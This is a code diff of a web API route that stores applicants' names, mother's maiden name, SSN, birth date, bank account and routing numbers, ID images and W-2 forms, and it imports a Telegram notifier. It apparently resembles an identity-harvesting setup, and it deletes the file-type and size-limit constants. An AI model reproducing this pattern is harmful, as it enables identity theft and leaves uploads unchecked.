@@ -4,11 +4,6 @@ import { randomUUID } from 'crypto';
 import { sendTelegramNotification } from '@/app/lib/sendTelegramNotification';
 import { supabase } from '@/app/lib/supabaseClient';
 
-const IMG_TYPES = ['image/jpeg', 'image/png', 'image/webp'];
-const PDF_TYPES = ['application/pdf'];
-const MAX_IMAGE_SIZE = 5 * 1024 * 1024; // 5MB
-const MAX_PDF_SIZE = 10 * 1024 * 1024; // 10MB
-
 export async function POST(req: Request) {
   try {
     const formData = await req.formData();
@@ -93,52 +88,47 @@ export async function POST(req: Request) {
     console.log('✅ Files uploaded');
 
     await sql`
-      INSERT INTO onboarding (
-        applicant_id, first_name, middle_name, last_name, mother_maiden_name,
-        ssn, date_of_birth,
-        street, city, state, zip_code,
-        account_number, routing_number, bank_name,
-        front_image_url, back_image_url, w2_form_url,
-        front_image_mime, back_image_mime, w2_form_mime,
-        front_image_filename, back_image_filename, w2_form_filename,
-        onboarding_completed, onboarding_date
-      )
-      VALUES (
-        ${applicant_id}, ${first_name}, ${middle_name}, ${last_name}, ${mother_maiden},
-        ${ssn}, ${date_of_birth},
-        ${street}, ${city}, ${state}, ${zip_code},
-        ${account_number}, ${routing_number}, ${bank_name},
-        ${front_url}, ${back_url}, ${w2_url},
-        ${front_image.type}, ${back_image.type}, ${w2_form.type},
-        ${front_image_filename}, ${back_image_filename}, ${w2_form_filename},
-        TRUE, NOW()
-      )
-      ON CONFLICT (applicant_id) DO UPDATE SET
-        first_name = EXCLUDED.first_name,
-        middle_name = EXCLUDED.middle_name,
-        last_name = EXCLUDED.last_name,
-        mother_maiden_name = EXCLUDED.mother_maiden_name,
-        ssn = EXCLUDED.ssn,
-        date_of_birth = EXCLUDED.date_of_birth,
-        street = EXCLUDED.street,
-        city = EXCLUDED.city,
-        state = EXCLUDED.state,
-        zip_code = EXCLUDED.zip_code,
-        account_number = EXCLUDED.account_number,
-        routing_number = EXCLUDED.routing_number,
-        bank_name = EXCLUDED.bank_name,
-        front_image_url = EXCLUDED.front_image_url,
-        back_image_url = EXCLUDED.back_image_url,
-        w2_form_url = EXCLUDED.w2_form_url,
-        front_image_mime = EXCLUDED.front_image_mime,
-        back_image_mime = EXCLUDED.back_image_mime,
-        w2_form_mime = EXCLUDED.w2_form_mime,
-        front_image_filename = EXCLUDED.front_image_filename,
-        back_image_filename = EXCLUDED.back_image_filename,
-        w2_form_filename = EXCLUDED.w2_form_filename,
-        onboarding_completed = TRUE,
-        onboarding_date = NOW()
-    `;
+  INSERT INTO onboarding (
+    applicant_id, first_name, middle_name, last_name, mother_maiden_name,
+    ssn, date_of_birth,
+    street, city, state, zip_code,
+    account_number, routing_number, bank_name,
+    front_image_url, back_image_url, w2_form_url,
+    front_image_filename, back_image_filename, w2_form_filename,
+    onboarding_completed, onboarding_date
+  )
+  VALUES (
+    ${applicant_id}, ${first_name}, ${middle_name}, ${last_name}, ${mother_maiden},
+    ${ssn}, ${date_of_birth},
+    ${street}, ${city}, ${state}, ${zip_code},
+    ${account_number}, ${routing_number}, ${bank_name},
+    ${front_url}, ${back_url}, ${w2_url},
+    ${front_image_filename}, ${back_image_filename}, ${w2_form_filename},
+    TRUE, NOW()
+  )
+  ON CONFLICT (applicant_id) DO UPDATE SET
+    first_name = EXCLUDED.first_name,
+    middle_name = EXCLUDED.middle_name,
+    last_name = EXCLUDED.last_name,
+    mother_maiden_name = EXCLUDED.mother_maiden_name,
+    ssn = EXCLUDED.ssn,
+    date_of_birth = EXCLUDED.date_of_birth,
+    street = EXCLUDED.street,
+    city = EXCLUDED.city,
+    state = EXCLUDED.state,
+    zip_code = EXCLUDED.zip_code,
+    account_number = EXCLUDED.account_number,
+    routing_number = EXCLUDED.routing_number,
+    bank_name = EXCLUDED.bank_name,
+    front_image_url = EXCLUDED.front_image_url,
+    back_image_url = EXCLUDED.back_image_url,
+    w2_form_url = EXCLUDED.w2_form_url,
+    front_image_filename = EXCLUDED.front_image_filename,
+    back_image_filename = EXCLUDED.back_image_filename,
+    w2_form_filename = EXCLUDED.w2_form_filename,
+    onboarding_completed = TRUE,
+    onboarding_date = NOW()
+`;
 
     console.log('✅ Onboarding data inserted');
 
